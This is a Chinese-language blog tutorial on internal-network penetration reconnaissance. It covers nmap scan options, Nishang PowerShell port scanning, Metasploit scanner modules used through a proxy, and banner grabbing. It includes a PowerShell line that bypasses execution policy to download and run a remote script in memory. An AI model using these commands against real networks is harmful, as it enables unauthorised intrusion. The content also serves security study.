@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>内网渗透体系建设--第2章--内网资源探测--端口扫描--msf探测--端口Banner信息 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="1.利用Telnet探测端口
+telent &lt;IP&gt; &lt;Port&gt;
+2.nmap
+nmap -p 端口号
+参数  说明
+-sT TCP连接扫描
+-sS TCP SYN扫描(半开扫描), 需要root权限
+-sF TC..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">内网渗透体系建设--第2章--内网资源探测--端口扫描--msf探测--端口Banner信息</h2>
+            <div class="post-date">2023-03-31</div>
+            
+            <div class="post-content" v-pre>
+              <p><strong>1.利用Telnet探测端口</strong><br>
+<code>telent &lt;IP&gt; &lt;Port&gt;</code></p>
+<p><strong>2.nmap</strong></p>
+<p><code>nmap -p 端口号</code></p>
+<pre><code>参数  说明
+-sT TCP连接扫描
+-sS TCP SYN扫描(半开扫描), 需要root权限
+-sF TCP FIN扫描
+-sN TCP 空扫描
+-sX TCP 圣诞树扫描
+-sA TCP ACK扫描
+-sU UDP 扫描, 结果不大可靠
+-sP ping扫描,nmap端口扫描的时候默认就是使用ping扫描
+只有主机存活, Nmap才会继续扫描
+此外还有一些参数：
+
+参数  说明
+-sR RPC扫描
+-sV 版本扫描
+-b  FTP代理扫描
+-P0 扫描前不ping主机
+-v  显示详细扫描过程
+-p  指定扫描端口
+-O  操作系统探测
+-A  全面系统探测,启用脚本检测、扫描等
+-sC 根据端口识别的服务，调用默认脚本
+--script=脚本名称   使用脚本引擎, 有多种功能的脚本,如
+漏洞扫描、漏洞利用、目录扫描等功能
+</code></pre>
+<p><strong>3,powershell端口扫描</strong></p>
+<p>nishang</p>
+<p>设置权限<br>
+<code>Set-ExecutionPolicy RemoteSigned</code><br>
+加载模块<br>
+<code>Import-Module .\nishang.psm1</code><br>
+获取模块<br>
+<code>Get-Command -Module nishang</code><br>
+对某个网段的主机进行端口扫描<br>
+<code>Invoke-PortScan -StartAddress 192.168.52.1 -EndAddress 192.168.52.138 -ResolveHost -ScanPort</code></p>
+<p>远程加载扫指定端口<br>
+<code>powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString('http://192.168.92.1/Invoke-PortScan.ps1');Invoke-PortScan -StartAddress 192.168.92.1 -EndAddress 192.168.92.30 -ResolveHost -ScanPort -Port 80,88,135,139,443,445,3306,3389,8080&quot;</code></p>
+<p><strong>4.msf探测内网</strong><br>
+MetaSploite的auxiliary/scanner中存放了许多后渗透扫描功能模块。</p>
+<p>msf-NetBIOS扫描存活主机：</p>
+<pre><code>msf5 exploit(multi/handler) &gt; use auxiliary/scanner/netbios/nbname 
+msf5 auxiliary(scanner/netbios/nbname) &gt; set rhosts 192.168.52.0/24
+msf5 auxiliary(scanner/netbios/nbname) &gt; run
+</code></pre>
+<p>cs--socks代理--msf端口扫描：<br>
+1.<br>
+<img src="https://dydydy123.github.io/post-images/1678890359645.png" alt="" loading="lazy"><br>
+<img src="https://dydydy123.github.io/post-images/1678890384236.png" alt="" loading="lazy"><br>
+2.</p>
+<pre><code>端口扫描
+use auxiliary/scanner/portscan/tcp
+基本设置
+show options
+高级设置
+show advanced 
+setg Proxies socks4:192.168.159.128:36428
+
+</code></pre>
+<p><strong>5.端口Banner信息</strong><br>
+端口中的Banner往往会泄露重要信息，比如得到软件开发商，软件型号，服务类型，版本号这些信息（主要是最后两个）</p>
+<pre><code>nc ip port
+telnet ip port
+nmap --script=banner -Pn 127.0.0.1/24
+nmap -A -Pn 127.0.0.1/24
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-nei-wang-zi-yuan-tan-ce-zhu-ji-fa-xian/">
+                  <h3 class="post-title">
+                    内网渗透体系建设--第2章--内网资源探测--主机发现
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
